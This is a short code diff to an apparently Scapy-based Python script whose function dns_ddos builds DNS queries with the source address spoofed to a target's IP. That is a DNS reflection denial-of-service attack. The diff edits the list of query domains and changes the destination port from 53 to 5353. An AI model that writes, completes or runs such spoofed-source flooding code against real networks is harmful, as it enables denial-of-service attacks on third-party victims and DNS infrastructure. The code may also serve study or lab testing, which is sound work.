@@ -9,7 +9,7 @@ import concurrent.futures
 import sys
 import time
 
-dns_hosts = ["example.com.","www.example.com.","example.org","example.be","example.fr","test.com","a-very-long-domain-name.com","a-very-long-domain-name.org","oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof","i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof","domain.oof"]
+dns_hosts = ["example.com","www.example.com","example.org","example.be","example.fr","test.com","a-very-long-domain-name.com","a-very-long-domain-name.org","oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof","i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof","domain.oof"]
 
 
 def dns_ddos(target, dns_server):
@@ -17,7 +17,7 @@ def dns_ddos(target, dns_server):
 
     for host in dns_hosts:
         ip = IP(src=target, dst=dns_server)
-        udp = UDP(dport=53)
+        udp = UDP(dport=5353)
         dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))
 
         request = (ip/udp/dns)
